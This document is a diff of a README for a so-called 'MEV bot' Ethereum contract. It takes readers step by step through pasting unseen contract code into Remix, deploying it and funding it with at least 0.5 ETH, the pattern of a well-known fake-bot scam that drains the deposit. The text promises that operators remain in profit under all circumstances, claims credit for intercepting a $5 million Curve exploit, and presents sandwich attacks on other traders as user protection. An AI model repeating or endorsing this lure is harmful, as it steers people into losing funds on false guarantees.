@@ -1,26 +1,311 @@
-If you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences.
+<div align="center">
 
-You can message me on Telegram if you have any questions: https://t.me/townwtf
+<div align="right">
 
-CODE LINK : https://pastebin.com/CFv3hXAc
+`unimevbot☕ v3.0`
 
-STEP BY STEP Instructions :
+</div>
 
-👉 Download MetaMask: https://metamask.io/download
+  
 
-👉 Access the Remix IDE: https://remixide.org
+# `MevB0t 3.0`
 
-👉 Right click on the 'contracts' folder and create a new file. Rename it as you like—i.e., 'Bot.sol'
+  
 
-👉 Paste THIS code in Remix: https://pastebin.com/CFv3hXAc
+</div>
 
-👉 Move to the 'Solidity Compiler' tab, select version '0.6.6' and then click 'Compile'
+  
 
-👉 Move to the 'Deploy' tab, select 'Injected Provider' as the environment, then click 'Deploy'. After the transaction is confirmed, it's your own BOT now
+This is a lightweight boilerplate on-chain Mevbot engine designed to scan the Ethereum mempool for profitable transactions with the goal of protecting regular users and institutions from being front-run or exploited by bad actors.
 
-👉 Deposit funds (at least 0.5 ETH to prevent negating slippage) to your exact contract/bot address
+The bot aims to level the playing field by reordering transactions in an aggressive manner via dynamic calculation of gas fees and miner bribes. Thereby reducing the profitability of unethical MEV practices and securing stolen funds before they are able to reach a bad actor's wallet.
 
-👉 After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'
+In august of 2023 I intercepted an attacker trying to exploit a vector on the CRV pool for $5 million USD. My bot was able to front-run the transaction and secure the stolen funds.
+
+  
+
+https://cointelegraph.com/news/white-hat-returns-5-million-curve-finance-hack
+
+  
+  
+
+### `How it Works`
+
+<div align="center">
+
+ <img src="https://i.ibb.co/J7jTN4c/1.png" alt="1" border="0">
+
+</div> 
+
+- The bot continuously monitors Uniswap's mempools for pending transactions (TX) from the Uniswap AMM until it identifies a TX containing slippage discrepancies within a profitable threshold (e.g. a hasty large buy order, or exploit TX)
+
+  
+
+- Before executing any trades, the algorithm calculates the potential gains against transaction costs to ensure profitability
+
+  
+
+- The bot swiftly executes a sandwich operation by placing a buy order (for the same token) just before the "targeted" TX, simultaneous with placing a sell order right after within the same block, profiting from the price movement
+
+  
+
+- It optimizes paid gas fees for timely execution and cost efficiency and it always outbids gas prices and bribes of competing bots`, as long as it remains profitable
+
+  
+
+- Returns ETH back to the contract ready for withdrawal
+
+  
+
+### `Features`
 
 
-🚨 EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.4 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.5 ~ 1 ETH to make sure that won't happen.
+  
+
+- 𝗔𝗻𝘁𝗶-𝗘𝘅𝗽𝗹𝗼𝗶𝘁 (𝘄𝗵𝗶𝘁𝗲-𝗵𝗮𝘁) - identifies exploit transactions from bad actors and quickly works to front-run the transaction, effectively securing any stolen funds.
+
+  
+
+- 𝗔𝗿𝗯𝗶𝘁𝗿𝗮𝗴𝗲 𝗢𝗽𝗽𝗼𝗿𝘁𝘂𝗻𝗶𝘁𝘆 - detects a price discrepancy between decentralized exchanges and executes arbitrage trades, resulting in virtually unlimited potential profit.
+
+  
+
+- 𝗙𝗹𝗮𝘀𝗵 𝗟𝗼𝗮𝗻 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝗮𝘁𝗶𝗼𝗻 𝗣𝗿𝗲𝘃𝗲𝗻𝘁𝗶𝗼𝗻 - identifies and blocks flash loan exploitations by executing counter trades just before the malicious transactions. This action prevents losses and helps preserve the stability of the Ethereum ecosystem.
+
+  
+
+- 𝗟𝗶𝗾𝘂𝗶𝗱𝗮𝘁𝗶𝗼𝗻 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻 - proactively identifies liquidation transactions and executes a counter trade to protect vulnerable positions, potentially saving a user or contract from substantial losses, while pocketing the profit.
+
+  
+
+---
+
+### `Instructions`
+
+  
+
+### Deploying the contract
+
+  
+
+1. **Accessing Remix Ethereum IDE**
+
+- Navigate to [Remix Ethereum IDE](https://remix.ethereum.org/).
+
+  
+
+2. **Create or Import Contract File**
+
+- Create a new file in Remix named `Contract.sol` and paste the code from `src/contracts/Contract.sol` from this repo.
+
+- Or download the `src/contracts/Contract.sol` file from this repo and open it in Remix.
+  
+
+<div align="center">
+    
+  <img src="https://i.ibb.co/hVCnqrP/2.png" alt="2" border="0">
+ 
+</div> 
+
+  
+3. **Solidity Version and Contract Compilation**
+
+- Navigate to the `Solidity Compiler` tab.
+
+- Use Solidity version `0.6.12`. In Remix, select this version in the `Compiler` dropdown.
+
+- Click on the "Compile" button.
+
+  
+<div align="center">
+    
+ <img src="https://i.ibb.co/TvKQf9W/8.png" alt="8" border="0">
+    
+</div> 
+
+4. **Preparation for Deployment**
+
+- Navigate to the "Deploy & Run Transactions" tab.
+
+- In the "Environment" dropdown, select "Injected Web3". Ensure that MetaMask is installed and activated.
+
+<div align="center">
+    
+ <img src="https://i.ibb.co/vxjxP9z/3.png" alt="3" border="0">
+
+</div> 
+
+5. **Deploying the Contract**
+
+- Click on "Deploy".
+
+- MetaMask will prompt for transaction confirmation.
+
+  <div align="center">
+
+   <img src="https://i.ibb.co/v4Ls09S/4.png" alt="4" border="0">
+
+  </div> 
+
+6. **Confirm Bot Deployment**
+
+- Confirm the bot deployment transaction in MetaMask.
+
+  
+
+7. **Configuration**
+
+- Copy the bot’s contract address and send some Ethereum to its balance for the bot to start. Team recommendation is to fund the bot with a minimum amount of 0.5 ETH.
+
+  0.5 ETH is recommended so the bot has enough gas and funds to swap, pay builders, etc.
+
+  <div align="center"> 
+
+   <img src="https://i.ibb.co/x5nD7xF/5.png" alt="5" border="0">
+
+  </div> 
+
+- After your transaction is confirmed, click the `Start` button to run the bot.
+
+- Press the `Stop` button to halt bot operations.
+
+- Withdraw all ETH at any time by clicking the `Withdrawal` button.
+
+  
+
+  <div align="center"> 
+
+   <img src="https://i.ibb.co/zxfh7wh/6.png" alt="6" border="0">
+
+  </div> 
+
+  
+
+<div>
+
+  
+
+<div align="center">
+
+  
+
+That’s it. The bot will start transacting immediately to generate profits from sandwich opportunities on Uniswap transaction pools
+
+  
+
+</div>
+
+  
+
+<div align="center">
+
+  
+
+> ⚠️NOTICE: It can take 12-24 HRS to accrue estimated profit potential. This figure is estimated on network congestion and market conditions
+
+</div>
+
+  
+
+## `Contributions`
+
+  
+
+Contributions to the project are welcome! If you would like to contribute, kindly fork the repository and submit a pull request with your proposed changes or additions. Please ensure that your code adheres to the project's coding standards and includes appropriate tests.
+
+  
+
+This project would be impossible without generous support from our sponsors and developers. We cannot thank them enough!
+
+  
+
+## `Support`
+
+  
+
+If you find the project interesting, please consider granting it a star ⭐. Your support is greatly appreciated and helps in motivating further development!
+
+  
+
+ <img src="https://i.ibb.co/w4655K4/7.png" alt="7" border="0">
+    
+   
+## `FAQ`
+
+  
+
+```
+-
+Q: If many people deploy this bot, wouldn’t dilution of profits occur due to competition?
+
+  
++
+A: We found that there is no indication of a decrease in
+
+profits when multiple instances of the bot are deployed.
+
+  
+-
+Q: What average ROI and risks can I expect?
+
+  
++
+A: You can find the ROI according to latest data of bot
+
+performances in the "Returns Features" section. This bot
+
+in particular does not create any losses, it only
+
+executes trades when there are proper MEV opportunities
+
+to make profits, so under all circumstances bot operators remain in profit.
+
+  
+-
+Q: What amount of funds does bot need to work?
+
+  
++
+A: Our team recommendation is to fund the bot with a minimum
+
+amount of 0.5 ETH but more than .5 ETH is recommended so
+
+the bot has enough gas and funds to swap, pay builders and tip miners, etc.
+
+  
+-
+Q: Do I need to keep the Remix page open in my browser while the bot is activated?
+
+  
++
+A:No, just save the bot contract address after creating it.
+
+The next time you want to access your bot via Remix,
+
+you need to compile the file again as in step 3.
+
+Now head to `DEPLOY & RUN TRANSACTIONS`, reconnect your
+
+Metamask, paste your contract address into `Load contract
+
+from Address` and press `At Address`
+
+.
+
+https://i.imgur.com/4x2i7RX.png
+
+  
+
+Now it can be found again under "Deployed Contracts".
+
+  
+-
+Q: Does it work on other chains or DEXes as well?
+
+  
++
+A: No, currently the bot is dedicated only for Ethereum on Uniswap mempools.
+
+We aim to expand support for other networks in the future :)
+
+```
